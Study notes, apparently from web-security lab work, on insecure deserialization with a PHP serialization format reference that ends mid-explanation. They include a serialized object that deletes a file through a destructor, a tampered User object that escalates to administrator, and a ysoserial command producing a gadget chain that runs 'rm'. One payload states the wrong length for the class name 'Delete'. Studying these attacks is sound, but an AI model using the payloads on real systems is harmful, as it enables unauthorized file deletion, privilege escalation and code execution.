Consider that we were able to retrieve the source of a php file by appending `~` in our request and extracted the below:
```
    function __destruct() {
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
```
We could delete files by creating an object and sending in a valid parameter:
```
O:14:"Delete":1:{s:14:"lock_file_path";s:23:"/home/shrek/payslip.txt";}
```

A basic privilege escalation:
`O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"mo9iwmmkmyv7opm4fmdjy4e8brusnvey";}`
Change to:
`O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}`

With ysoserial remember to url encode your generated payload
`java -jar path/to/ysoserial.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64`

Objects are serialized as:  
`O:<i>:"<s>":<i>:{<properties>}`  
where the first `<i>` is an integer representing the string length of `<s>`, and `<s>` is the fully qualified class name (class name prepended with full namespace). The second `<i>` is an integer representing the number of object properties. `<properties>` are zero or more serialized name value pairs:  

Booleans are serialized as:  
`b:<i>;`  
where `<i>` is an integer with a value of either 0 (false) or 1 (true).  

Integers are serialized as:  
`i:<i>;`  
where `<i>` is the integer value.  

Floats are serialized as (with d meaning double):  
`d:<f>;`  
where `<f>` is the float value.  

Strings are serialized as:  
`s:<i>:"<s>";`  
where `<i>` is an integer representing the string length of `<s>`, and `<s>` is the string value.  

Special types:  
null is simply serialized as:  
`N;`  

Arrays are serialized as:  
`a:<i>:{<elements>}`  
where `<i>` is an integer representing the number of elements in the array, and `<elements>` zero or more serialized key value pairs:  
`<key><value>`  
where `<key>` represents a serialized scalar type, and `<value>` any value that is serializable.  
  
`<name><value>`  
where `<name>` is a serialized string representing the property name, and `<value>` any value that is serializable.  
There's a catch with `<name>` though:  
`<name>` is represented as  
`s:<i>:"<s>";`  
where `<i>` is an integer representing the string length of `<s>`. But the values of `<s>` differs per visibility of properties:  

